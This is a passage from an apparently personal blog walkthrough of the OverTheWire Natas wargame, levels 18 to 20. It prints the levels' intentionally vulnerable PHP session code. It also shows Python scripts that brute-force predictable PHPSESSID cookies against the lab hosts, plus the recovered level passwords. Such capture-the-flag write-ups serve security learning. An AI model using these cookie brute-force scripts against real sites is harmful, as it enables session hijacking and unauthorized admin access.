</span><span class='line'>    <span class="k">return</span> <span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">createID</span><span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">global</span> <span class="nv">$maxid</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$maxid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">debug</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;DEBUG: </span><span class="si">$msg</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">my_session_start</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;PHPSESSID&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)</span> <span class="k">and</span> <span class="nx">isValidID</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;PHPSESSID&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">session_start</span><span class="p">())</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session start failed&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session start ok&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session was old: admin flag set&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// backwards compatible, secure</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas19</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nv">$showform</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">my_session_start</span><span class="p">())</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>    <span class="nv">$showform</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">session_id</span><span class="p">(</span><span class="nx">createID</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]));</span>
</span><span class='line'>    <span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">isValidAdminLogin</span><span class="p">();</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;New session started&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$showform</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>    <span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>This is a lot of code, but first let&rsquo;s see its behavior. When you enter something in the form, a random PHPSESSID between 1 and 640 is created. Then you see the message that you are logged in as a regular user. If you turn debug on and try tampering with the cookie, you will see the message that the session was old and the admin flag was set. The objective appears to be to log in with an admin session ID, and then the credentials for the next level will be printed to the screen. The first time I looked over the code and noticed the fact that the $maxid can be predicted and bruteforced, I thought that&rsquo;s the way to go, but first to understand the code:</p>

<ul>
<li><p>the $maxid holds the maximum value of a PHPSESSID &ndash;> 640</p></li>
<li><p>isValidAdminLogin() just returns 0, so whenever it&rsquo;s called it will set the admin session ID to 0 (not what we want)</p></li>
<li><p>isValidID($id) returns True if the ID is a valid number or numeric string, False otherwise</p></li>
<li><p>createID($user) this is the function that creates the PHPSESSID, with a random value between 1 and 640 (predictable and not long to bruteforce, not what we want in a session ID)</p></li>
<li><p>debug($msg) this just prints messages such as session started, etc.</p></li>
<li><p>my_session_start() this starts a session if there is a valid PHPSESSID cookie, and sets the admin session ID to 0 if it doesn&rsquo;t exist in the $_SESSION array</p></li>
<li><p>print_credentials() prints the password we&rsquo;re after if there is an admin session ID that&rsquo;s set to 1 in the $_SESSION array. Otherwise it just prints a regular message</p></li>
</ul>


<p>Well, the main vulnerabilities are the predictable session ID and the fact that the session starts based on the existence and validity of a cookie, which we can freely control. Since we need to be admin for the next level, we have to bruteforce the session cookies until we hit upon the one with the admin flag set to 1. Python to the rescue again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">success</span> <span class="o">=</span> <span class="s">&#39;You are an admin&#39;</span>
</span><span class='line'><span class="n">session_id</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">session_id</span> <span class="o">&lt;</span> <span class="mi">640</span><span class="p">:</span>
</span><span class='line'>    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)}</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Trying with session ID: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;http://natas18.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas18&#39;</span><span class="p">,</span> <span class="s">&#39;xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP&#39;</span><span class="p">),</span> \
</span><span class='line'>                          <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">success</span> <span class="ow">in</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Admin session ID was: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>    <span class="n">session_id</span> <span class="o">+=</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>I ran it and it discovered the admin session ID was 46. Password for the next level is <code>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</code></p>

<h3>Level 19</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas19.png" title="natas19" alt="natas 19"></p>

<p>We don&rsquo;t have source code this time and apparently the session IDs aren&rsquo;t sequential anymore..Let&rsquo;s see. I logged in with some dummy values and noticed the PHPSESSID cookie is hex encoded now. Decoding it..surprise! It looked like this: <code>512-admin</code>. <em>admin</em> was what I put in the username field. I tried more bogus values for username and password and noticed that the session ID cookie is always constructed like this: <code><em>random number-username</em></code>. So again, brute forcing to the rescue! Since I didn&rsquo;t know how much of the code from the previous challenge has changed, I assumed the max session ID value remained the same:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">success</span> <span class="o">=</span> <span class="s">&#39;You are an admin&#39;</span>
</span><span class='line'><span class="n">session_id</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">session_id</span> <span class="o">&lt;</span> <span class="mi">640</span><span class="p">:</span>
</span><span class='line'>    <span class="n">pattern</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;-admin&#39;</span>
</span><span class='line'>    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">pattern</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)}</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Trying with session ID: &#39;</span> <span class="o">+</span> <span class="n">pattern</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;http://natas19.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas19&#39;</span><span class="p">,</span> <span class="s">&#39;4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs&#39;</span><span class="p">),</span> \
</span><span class='line'>                          <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">success</span> <span class="ow">in</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Admin session ID was: &#39;</span> <span class="o">+</span> <span class="n">pattern</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">cookie</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>    <span class="n">session_id</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>


<p>And after a while I hit the jackpot with a sessiod ID of <em>381-admin</em>. The password for the next level is <code>eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</code></p>

<h3>Level 20</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas20.png" title="natas20" alt="natas 20"></p>

<p>Code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">debug</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;DEBUG: </span><span class="si">$msg</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas21</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
</span><span class='line'><span class="k">function</span> <span class="nf">myopen</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYOPEN $path $name&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
</span><span class='line'><span class="k">function</span> <span class="nf">myclose</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYCLOSE&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">myread</span><span class="p">(</span><span class="nv">$sid</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;MYREAD </span><span class="si">$sid</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">strspn</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="s2">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$sid</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Invalid SID&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">session_save_path</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="s2">&quot;mysess_&quot;</span> <span class="o">.</span> <span class="nv">$sid</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session file doesn&#39;t exist&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Reading from &quot;</span><span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Read [</span><span class="si">$line</span><span class="s2">]&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$parts</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="nv">$line</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$parts</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">session_encode</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">mywrite</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// $data contains the serialized version of $_SESSION</span>
</span><span class='line'>    <span class="c1">// but our encoding is better</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;MYWRITE </span><span class="si">$sid</span><span class="s2"> </span><span class="si">$data</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// make sure the sid is alnum only!!</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">strspn</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="s2">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$sid</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Invalid SID&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">session_save_path</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="s2">&quot;mysess_&quot;</span> <span class="o">.</span> <span class="nv">$sid</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Saving in &quot;</span><span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">ksort</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> =&gt; </span><span class="si">$value</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> </span><span class="si">$value</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">chmod</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
</span><span class='line'><span class="k">function</span> <span class="nf">mydestroy</span><span class="p">(</span><span class="nv">$sid</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYDESTROY $sid&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
</span><span class='line'><span class="k">function</span> <span class="nf">mygarbage</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYGARBAGE $t&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nb">session_set_save_handler</span><span class="p">(</span>
</span><span class='line'>    <span class="s2">&quot;myopen&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;myclose&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;myread&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;mywrite&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;mydestroy&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;mygarbage&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Name set to &quot;</span> <span class="o">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$name</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
